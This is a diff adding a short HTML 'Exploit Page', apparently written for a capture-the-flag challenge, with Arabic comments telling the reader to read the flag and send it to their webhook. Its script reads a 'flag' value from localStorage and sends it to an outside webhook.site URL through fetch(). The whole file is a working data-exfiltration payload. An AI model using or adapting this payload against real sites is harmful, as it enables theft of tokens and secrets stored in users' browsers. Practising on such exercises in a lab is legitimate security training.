@@ -1,0 +1,13 @@
+<!doctype html>
+<html>
+  <body>
+    <h1>Exploit Page</h1>
+    <script>
+      // اقرأ الفلاج
+      const flag = localStorage.getItem("flag");
+
+      // ابعته للويبهوك بتاعك
+      fetch("https://webhook.site/ab12345c-6789-xxxx-yyyy-zzzz?flag=" + encodeURIComponent(flag));
+    </script>
+  </body>
+</html>
